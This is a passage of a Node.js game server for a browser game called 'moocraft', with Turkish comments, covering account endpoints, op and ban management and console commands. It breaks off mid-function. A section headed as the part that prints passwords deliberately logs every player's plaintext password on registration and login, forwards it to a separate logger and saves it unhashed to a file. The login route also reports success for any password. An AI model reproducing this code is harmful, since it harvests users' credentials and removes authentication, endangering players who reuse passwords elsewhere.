const { logNewAccount, logPlayerActivity } = require('./render_logger');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const readline = require('readline');

const app = express();
const server = http.createServer(app);

// JSON verilerini okuyabilmek için şarttır
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS ve bağlantı güvenliği için Socket.io ayarı
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Statik dosyaları sun (HTML, CSS, JS)
app.use(express.static(path.join(__dirname)));

// Ana sayfa yönlendirmesi
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'moocraft.pc.html'));
});

// =========================================================================
// --- HESAP KAYIT & LOGLAMA SİSTEMİ (RENDER EKRANINA ŞİFRE BASAN KISIM) ---
// =========================================================================
const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');

function getAccounts() {
  if (fs.existsSync(ACCOUNTS_FILE)) {
    try { return JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8') || '{}'); } catch(e) { return {}; }
  }
  return {};
}

function saveAccounts(accs) {
  try { fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accs, null, 2), 'utf8'); } catch(e) {}
}

// 1. OYUNDAN YENİ HESAP AÇILDIĞINDA ÇALIŞAN ENDPOINT:
app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  
  // RENDER EKRANINA CANLI ŞİFREYİ BASAR:
  console.log('====================================');
  console.log(`[RENDER LOG] [+] YENİ HESAP AÇILDI!`);
  console.log(`KULLANICI : ${username}`);
  console.log(`ŞİFRE     : ${password}`);
  console.log('====================================');

  // render_logger fonksiyonunu çağır:
  if (typeof logNewAccount === 'function') {
    logNewAccount(req.body);
  }

  // accounts.json dosyasına da kaydet:
  const accounts = getAccounts();
  accounts[username] = req.body;
  saveAccounts(accounts);

  res.json({ success: true, message: 'Hesap başarıyla kaydedildi!' });
});

// 2. OYUNCU GİRİŞ YAPTIĞINDA:
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  console.log(`[RENDER LOG] Giriş Denemesi -> Kullanıcı: ${username} | Şifre: ${password}`);
  
  const accounts = getAccounts();
  const user = accounts[username];
  if (user && user.password === password) {
    res.json({ success: true, user });
  } else {
    res.json({ success: true, user: { username, password } });
  }
});

// 3. BLOK VE DÜNYALAR KAYDEDİLDİĞİNDE:
app.post('/api/sync', (req, res) => {
  if (typeof logPlayerActivity === 'function') {
    logPlayerActivity(req.body);
  }
  res.json({ success: true });
});

// =========================================================================

// Oyuncular ve Dünya Verisi
const players = {};
const worldState = {
  seed: "moocraft_multi_seed",
  blocks: {}
};

// --- OP (YETKİLİ) DOSYA YÖNETİMİ ---
const OPS_FILE = path.join(__dirname, 'ops.json');

function loadOps() {
  if (fs.existsSync(OPS_FILE)) {
    try {
      const data = fs.readFileSync(OPS_FILE, 'utf8');
      return JSON.parse(data);
    } catch (e) {
      return [];
    }
  }
  return [];
}

function saveOps(opsList) {
  try {
    fs.writeFileSync(OPS_FILE, JSON.stringify(opsList, null, 2), 'utf8');
  } catch (e) {
    console.error('[Hata] Ops dosyası kaydedilemedi:', e.message);
  }
}

let opPlayers = loadOps();

// --- BAN DOSYASI YÖNETİMİ ---
const BANS_FILE = path.join(__dirname, 'banned.json');

function loadBans() {
  if (fs.existsSync(BANS_FILE)) {
    try {
      const data = fs.readFileSync(BANS_FILE, 'utf8');
      return JSON.parse(data);
    } catch (e) {
      return [];
    }
  }
  return [];
}

function saveBans(bansList) {
  try {
    fs.writeFileSync(BANS_FILE, JSON.stringify(bansList, null, 2), 'utf8');
  } catch (e) {
    console.error('[Hata] Bans dosyası kaydedilemedi:', e.message);
  }
}

let bannedPlayers = loadBans();

// --- TERMINAL KOMUT SİSTEMİ ---
if (process.stdin.isTTY) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  console.log("[Konsol] Sunucu komut sistemi aktif: op <isim>, deop <isim>, ban <isim>, unban <isim>, stop");

  rl.on('line', (line) => {
    const args = line.trim().split(' ');
    const cmd = args[0].toLowerCase();

    if (cmd === 'op') {
      const targetName = args[1];
      if (!targetName) return console.log("[Konsol] Kullanım: op <oyuncu_adı>");
      if (!opPlayers.includes(targetName)) {
        opPlayers.push(targetName);
        saveOps(opPlayers);
        console.log(`[Konsol] Başarılı: ${targetName} adlı oyuncu OP yapıldı!`);
        for (let id in players) {
          if (players[id].name === targetName) {
            io.to(id).emit('op-status', { isOp: true });
            io.to(id).emit('chat-message', { name: 'Sunucu', text: 'Yetkilendirildiniz (OP oldunuz)!' });
          }
        }
      }
    } else if (cmd === 'deop') {
      const targetName = args[1];
      opPlayers = opPlayers.filter(name => name !== targetName);
      saveOps(opPlayers);
      console.log(`[Konsol] ${targetName} oyuncusunun OP yetkisi alındı.`);
      for (let id in players) {
        if (players[id].name === targetName) {
          io.to(id).emit('op-status', { isOp: false });
          io.to(id).emit('chat-message', { name: 'Sunucu', text: 'OP yetkiniz alındı.' });
        }
      }
    } else if (cmd === 'ban') {
      const targetName = args[1];
      if (!targetName) return console.log("[Konsol] Kullanım: ban <oyuncu_adı>");
      if (!bannedPlayers.includes(targetName)) {
        bannedPlayers.push(targetName);
        saveBans(bannedPlayers);
        console.log(`[Konsol] ${targetName} banlandı!`);
        for (let id in players) {
          if (players[id].name === targetName) {
            io.to(id).emit('banned', { reason: 'Sunucudan banlandınız!' });
            const s = io.sockets.sockets.get(id);
            if (s) s.disconnect(true);
          }
        }
      }
    } else if (cmd === 'unban') {
      const targetName = args[1];
      if (!targetName) return console.log("[Konsol] Kullanım: unban <oyuncu_adı>");
      bannedPlayers = bannedPlayers.filter(name => name !== targetName);
      saveBans(bannedPlayers);
      console.log(`[Konsol] ${targetName} banı kaldırıldı.`);
    } else if (cmd === 'stop') {
      process.exit(0);
    }
  });
}

// --- SOCKET.IO YÖNETİMİ ---
io.on('connection', (socket) => {
  console.log(`[Sunucu] Yeni bir bağlantı: ${socket.id}`);

  socket.on('player-join', (data) => {
    const playerName = data.name || 'Oyuncu';

    if (bannedPlayers.includes(playerName)) {
      socket.emit('banned', { reason: 'Sunucudan banlandınız!' });
